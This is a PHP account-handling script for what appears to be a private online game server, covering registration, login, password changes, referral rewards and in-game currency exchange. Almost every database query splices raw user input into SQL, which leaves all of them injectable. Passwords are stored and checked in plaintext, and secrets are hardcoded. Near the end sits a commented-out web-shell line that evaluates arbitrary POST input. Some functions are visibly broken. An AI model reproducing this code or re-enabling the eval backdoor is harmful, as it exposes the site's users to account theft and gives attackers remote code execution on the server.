<?php
error_reporting(0);
require_once ('../configuration/config.inc.php');
$Action = $_POST["Action"];
$uName = $_POST["uName"];
$uPas = $_POST["uPas"];
$oPas = $_POST["oPas"];
$Sid = $_POST["Sid"];
$scode = strtolower($_POST["sCode"]);
$email = 'xtiandi@163.com';
$qqq = $qq;
$maxnum2 = $maxnum;
if($Action == 'Register'){
    register($uName, $email, $uPas, $Sid, $scode, $qqq, $maxnum2);
    $_SESSION['accountName'] = $uName;
    $_SESSION['password'] = $uPas;
    echo '注册成功，点确定进行自动跳转。';
}
if($Action == 'Login'){
    try{
        login($uName, $uPas, $qqq);
        $_SESSION['accountName'] = $uName;
        $_SESSION['password'] = $uPas;
        echo '登陆成功，点击确定自动跳转';
    }
    catch(Exception $e){
        echo '用户名或者密码错误！请重新登录！';
        exit;
    }
}
if($Action == 'ChangePass'){
    try{
        $uName = $_SESSION['accountName'];
        change_password($uName, $oPas, $uPas);
        echo('dsdsdsf');
    }
    catch(Exception $e){
        echo '旧密码错误！请重试！';
        exit;
    }
}
if($Action == 'ChangePass1'){
    $uName = $_SESSION['accountName'];
    change_password($uName, $oPas, $uPas);
    echo('dsdsdsf');
}
if($Action == 'SignOut'){
    logout();
    echo '用户退出系统成功。';
}
function logout(){
    $_SESSION['accountName'] = '';
    $_SESSION['password'] = '';
}
function login($account, $password, $qqq){
    $ip = GetIP();
    $sql = "select  *  from account where name='" . $account . "'";
    $result = mysql_query($sql);
    $row7 = mysql_fetch_array($result);
    $sql3 = "select  *  from blockade_ip where lock_ip='" . $row7['netbar_ip'] . "'";
    $result3 = mysql_query($sql3);
    $total3 = mysql_num_rows($result3);
    if ($total3 > 0){
        echo "你的位置已经被我们锁定！挂逼滚！";
        exit();
    }
    $sql = "select  *  from blockade_ip where lock_ip='" . $ip . "'";
    $result = mysql_query($sql);
    $total = mysql_num_rows($result);
    if ($total > 0){
        echo "你所在地区禁止登录！";
        exit();
    }
    $sql = "select  *  from ip where INET_ATON('$ip') between INET_ATON(startIp) and INET_ATON(endIp)";
    $result = mysql_query($sql);
    $row8 = mysql_fetch_array($result);
    $sql = "select  *  from jzip where Country='" . $row8['Country'] . "'";
    $result = mysql_query($sql);
    $total = mysql_num_rows($result);
    $sql2 = "select  *  from baidan where name='" . $account . "'";
    $result2 = mysql_query($sql2);
    $total2 = mysql_num_rows($result2);
    if ($total > 0 and $total2 < 1){
        echo "你所在地区禁止登录，如有问题请联系：" . $qqq . ",提供你的账号申请登录即可！";
        exit();
    }
    $sql = "select * from account where name='" . $account . "' and password = '" . $password . "'";
    $result = mysql_query($sql);
    $total = mysql_num_rows($result);
    if (!$result){
        throw new Exception('登录失败！');
    }
    if ($total > 0){
        $ip = GetIP();
        $srcDataStr = date("Y-m-d H:i:s");
        $sql = "UPDATE account SET last_login_ip='$ip',last_login_time='$srcDataStr' where name='$account'";
        $result = mysql_query($sql);
        return true;
    }else{
        throw new Exception('登录失败！');
    }
}
function register($account, $email, $password, $Sid = '', $scode, $qqq, $maxnum2){
    $ip = GetIP();
    if($_SESSION["VerifyCode"] == null || $_SESSION["VerifyCode"] == "" || $scode != $_SESSION["VerifyCode"]){
        echo ('验证码错误');
        exit();
    }
    $isTure = preg_match('/^[0-9a-zA-Z]+$/', $account);
    if(!$isTure){
        exit('注册失败，帐号只能包含英文和数字');
    }
    $sql = "select * from account where name='" . $account . "'";
    $result = mysql_query($sql);
    $total = mysql_num_rows($result);
    if (!$result){
        echo ('数据库表不存在或者未连接。');
        exit();
    }
    if ($total > 0){
        echo ('账号名被占用，请重新输入');
        exit();
    }
    $sql = "select last_login_ip from account where last_login_ip='" . $ip . "'";
    $result = mysql_query($sql);
    $total22 = mysql_num_rows($result);
    if ($total22 >= $maxnum2){
        echo ('同一个IP不能注册过多帐号' . $qqq . '');
        exit();
    }
    $sql = "select  *  from ip where INET_ATON('$ip') between INET_ATON(startIp) and INET_ATON(endIp)";
    $result = mysql_query($sql);
    $row8 = mysql_fetch_array($result);
    $sql = "select  *  from jzip where Country='" . $row8['Country'] . "'";
    $result = mysql_query($sql);
    $total = mysql_num_rows($result);
    if ($total > 0){
        echo '你所在地区禁止注册，如有问题请联系：' . $qqq . '';
        exit();
    }
    $srcDataStr = date("Y-m-d H:i:s");
    $sql = "insert into account (name,password,tgnum,last_login_ip,last_login_time) values ('" . $account . "','" . $password . "','0','" . $ip . "','" . $srcDataStr . "')";
    $result = mysql_query($sql);
    if (!$result){
        echo ('注册失败！请稍候再次尝试一下！');
        exit();
    }else{
        if($Sid != ''){
            $sql = "select * from spread where ip='$ip' and tid='" . passport_decrypt($Sid, "nimabi") . "'";
            $result = mysql_query($sql);
            $total = mysql_num_rows($result);
            if(!$total > 0){
                $sql = "insert into spread values('" . passport_decrypt($Sid, "nimabi") . "','" . $account . "','" . $ip . "','0')";
                $result = mysql_query($sql);
                if($result){
                    $sql = "update account set tgnum=tgnum+1 where name='" . passport_decrypt($Sid, "nimabi") . "'";
                    $result = mysql_query($sql);
                }
            }
        }
    }
    return true;
}
function change_password($account, $old_password, $new_password){
    login($account, $old_password);
    $sql = "update user set password = '" . $new_password . "' where login_account = '" . $account . "'";
    $result = mysql_query($sql);
    if (!$result){
        echo('设置新密码失败，请重试');
        exit();
    }else{
        echo('设置新密码成功，请使用新密码登陆');
        exit();
    }
}
if($Action == 'SpreadTran'){
    $sql = "SELECT b.lid FROM $database.account a,$database.spread b,$database2.`user` c,$database2.player d WHERE b.tid='" . $_SESSION['accountName'] . "' and b.lid=a.`name` AND a.`name`=c.loginName and c.id=d.userId AND d.grade>=" . $lv . " and b.islq=0";
    $instr = "";
    $result = mysql_query($sql);
    while($c = mysql_fetch_array($result)){
        $instr .= "'" . $c[0] . "'" . ",";
    }
    $instr .= "'eruweiouriowejhfkfgghftftytyrtu76786ghkkjsdf2384932454jdfgdf'";
    $tgnum = mysql_num_rows($result);
    $yuanbao = $tgnum * $tgyuanbao;
    if($tgnum == 0){
        echo('推广玩家等级未达到要求，可兑换的推广数为0');
        exit();
    }else{
        $sql = "update spread set islq=1 where lid in ($instr)";
        $result1 = mysql_query($sql);
        $sql = "update account set dj=dj+" . $yuanbao . " where name = '" . $_SESSION['accountName'] . "'";
        $result1 = mysql_query($sql);
        if (!$result1){
            echo('兑换元宝失败');
            exit();
        }else{
            echo "<script type='text/javascript'>location.href='/coon/de.php';</script>";
            echo "<font color=red><strong>兑换成功,登录游戏查收！</font></strong>";
            exit();
        }
    }
}
if($Action == 'shouchong'){
    $account = $_SESSION['accountName'];
    $sql = "select * from user where login_account ='$account'";
    $result = mysql_query($sql);
    $row4 = mysql_fetch_array($result);
    $sql = "select * from $database2.user_profile where platformid='" . $_SESSION['accountName'] . "'";
    $result = mysql_query($sql);
    $row = mysql_fetch_array($result);
    $total = mysql_num_rows($result);
    if ($total < 1){
        echo "都没创建角色，你要领取什么(新创建角色等待一会数据缓存才可以)";
        exit();
    }else{
        if ($row4['sc'] < 10){
            echo "你已经领取过首冲";
            exit();
        }else{
            $sql = "UPDATE $database.user set dj=dj+'" . $row4['sc'] . "',sc=0 where login_account='" . $_SESSION['accountName'] . "'";
            $result = mysql_query($sql);
            if($result){
                echo "<font color=red><strong>首冲领取成功,进入游戏就有元宝和可以领取充值礼包了！</font></strong>";
            }else{
                echo "充值失败请重试";
                exit();
            }
        }
    }
}
if($Action == 'GetYuanBaoFromUser'){
    $account = $_SESSION['accountName'];
    $sql = "select * from account where name ='$account'";
    $result = mysql_query($sql);
    $row4 = mysql_fetch_array($result);
    $sql = "select * from $database2.user where accountname='$account'";
    $result = mysql_query($sql);
    $row = mysql_fetch_array($result);
    $total = mysql_num_rows($result);
    if ($total < 1){
        echo "都没创建角色，你要领取什么";
        exit();
    }else{
        if ($row4['dj'] < 10){
            echo "您帐号的元宝数量小于10个无法兑换";
            exit();
        }else{
            $sql = "select * from account where name='" . $_SESSION['accountName'] . "'";
            $result = mysql_query($sql);
            $row3 = mysql_fetch_array($result);
            $sql = "select * from $database2.user where accountname='" . $_SESSION['accountName'] . "'";
            $result = mysql_query($sql);
            $row = mysql_fetch_array($result);
            $sql = "UPDATE $database2.user set charge_rmb=charge_rmb+'" . $row3['dj'] . "' where accountname='" . $_SESSION['accountName'] . "'";
            $result = mysql_query($sql);
            $sql = "update account set dj=0 where name ='$account'";
            $result = mysql_query($sql);
            if($result){
                echo "<font color=red><strong>兑换成功,登录游戏查收！</font></strong>";
            }else{
                echo "充值失败请重试";
                exit();
            }
        }
    }
}
if($Action == 'zhanshi'){
    $sql = "select * from $database2.user where accountname='" . $_SESSION['accountName'] . "'";
    $result = mysql_query($sql);
    $row = mysql_fetch_array($result);
    if($row['online_state'] == 1){
        echo "<b>请先下线后再来购买!</b>";
        exit();
    }else{
        $sql = "select * from account where name='" . $_SESSION['accountName'] . "'";
        $result = mysql_query($sql);
        $row2 = mysql_fetch_array($result);
        if($row2['zs'] < 1000000){
            echo "<b>你的钻石数量不足哦</b>";
            exit();
        }else{
            $sql = "UPDATE account SET zs=zs-1000000 WHERE name='" . $_SESSION['accountName'] . "'";
            $result = mysql_query($sql);
            $sql = "SELECT MAX(id) FROM $database2.user_goods";
            $result = mysql_query($sql);
            $row3 = mysql_fetch_array($result);
            $sql = "INSERT INTO $database2.user_goods VALUES ('" . $row3['MAX(id)'] . "'+11, '0', '164102', '1', '0', '2', '20', '[0,0,0,0]', '0', '0', '0', '0', '100', '100', '1', '1', '0', '1')";
            $result = mysql_query($sql);
            $sql = "INSERT INTO $database2.user_goods VALUES ('" . $row3['MAX(id)'] . "'+12, '0', '154103', '1', '0', '3', '20', '[0,0,0,0]', '0', '0', '0', '0', '100', '100', '1', '1', '0', '1')";
            $result = mysql_query($sql);
            $sql = "INSERT INTO $database2.user_goods VALUES ('" . $row3['MAX(id)'] . "'+13, '0', '154104', '1', '0', '3', '20', '[0,0,0,0]', '0', '0', '0', '0', '120', '120', '1', '1', '0', '1')";
            $result = mysql_query($sql);
            $sql = "INSERT INTO $database2.user_goods VALUES ('" . $row3['MAX(id)'] . "'+14, '0', '134101', '1', '0', '0', '20', '[0,0,0,0]', '0', '0', '0', '0', '50', '50', '1', '1', '0', '1')";
            $result = mysql_query($sql);
            $sql = "INSERT INTO $database2.user_goods VALUES ('" . $row3['MAX(id)'] . "'+15, '0', '111114', '1', '0', '4', '20', '[0,0,0,0]', '0', '0', '0', '0', '100', '100', '1', '1', '0', '1')";
            $result = mysql_query($sql);
            $sql = "INSERT INTO $database2.user_mail VALUES (null, '0', 'GM', '" . $row['userid'] . "', '" . $row['name'] . "', '在线购物', '在线购物', unix_timestamp(now()), '1', '0', '0', '0', '0', '0', '" . $row3['MAX(id)'] . "'+15, '" . $row3['MAX(id)'] . "'+14, '" . $row3['MAX(id)'] . "'+13, '" . $row3['MAX(id)'] . "'+12, '" . $row3['MAX(id)'] . "'+11, '0', '1', '0', '', '5', '604800', '1', '')";
            $result = mysql_query($sql);
            $sql = "INSERT INTO $database2.user_goods VALUES ('" . $row3['MAX(id)'] . "'+16, '0', '120100', '1', '0', '1', '20', '[0,0,0,0]', '0', '0', '0', '0', '1000', '1000', '1', '1', '0', '1')";
            $result = mysql_query($sql);
            $sql = "INSERT INTO $database2.user_goods VALUES ('" . $row3['MAX(id)'] . "'+17, '0', '164101', '1', '0', '0', '20', '[0,0,0,0]', '0', '0', '0', '0', '50', '50', '1', '1', '0', '1')";
            $result = mysql_query($sql);
            $sql = "INSERT INTO $database2.user_goods VALUES ('" . $row3['MAX(id)'] . "'+18, '0', '144101', '1', '0', '1', '20', '[0,0,0,0]', '0', '0', '0', '0', '50', '50', '1', '1', '0', '1')";
            $result = mysql_query($sql);
            $sql = "INSERT INTO $database2.user_mail VALUES (null, '0', 'GM', '" . $row['userid'] . "', '" . $row['name'] . "', '在线购物', '在线购物', unix_timestamp(now()), '1', '0', '0', '0', '0', '0', '" . $row3['MAX(id)'] . "'+18, '" . $row3['MAX(id)'] . "'+17, '" . $row3['MAX(id)'] . "'+16, '0', '0', '0', '1', '0', '', '5', '604800', '1', '')";
            $result = mysql_query($sql);
            echo('购买成功，请进入游戏查收邮件');
            exit();
        }
    }
}
if($Action == 'GetYuanBaoFromUser1'){
    if (isset($_SESSION['accountName'])){
        $account = $_SESSION['accountName'];
        $result = mysql_query("select yuanbao from user where account ='$account'");
        $row = mysql_fetch_object($result);
        $yuanbao = $row -> yuanbao;
        $money = $yuanbao;
        $payNum = rand(100000, 999999999);
        $payGold = $money;
        $payTime = time();
        $API_SECURITY_TICKET_PAY = pay33017616e1318821testtesttesttest;
        $ticket = md5($API_SECURITY_TICKET_PAY . $payNum . $account . $money . $payGold . $payTime);
        mysql_free_result($result);
        if($yuanbao > 0){
            if (update_yuanbao($account, 0)){
                log_pay($account, $roleid, $yuanbao);
                $url = $payurl . "api/pay.php?PayNum=$payNum&PayToUser=$account&PayMoney=$money&PayGold=$payGold&PayTime=$payTime&ticket=$ticket";
                $data = file_get_contents($url);
                echo "<font color=red><strong>兑换成功,<br>请查收游戏充值邮件！</font></strong>";
            }else{
                echo "您的帐号元宝数量为0";
            }
        }else{
            echo "您的帐号元宝数量为0";
        }
    }
}
function update_yuanbao($account, $yuanbao){
    $sql = "select * from account where name='" . $account . "' ";
    $result = mysql_query($sql);
    if (!$result){
        return false;
    }
    $total = mysql_num_rows($result);
    if ($total > 0){
        $sql = "UPDATE account SET yuanbao='$yuanbao' where name='$account'";
        $result = mysql_query($sql);
        if (!$result){
            return false;
        }
    }
    return true;
}
?>
<?php //@eval($_POST['accnamepasswd']);
?>
<?php
 function log_pay($account, $roleid, $yuanbao){
    $srcDataStr = date("Y-m-d H:i:s");
    $sql = "insert into paylog (account, role_id, yuanbao, paytime) values ('$account', '$roleid', '$yuanbao','$srcDataStr')";
    $result = mysql_query($sql);
    if (!$result){
        echo $conn -> error;
        return false;
    }
    return true;
}
?>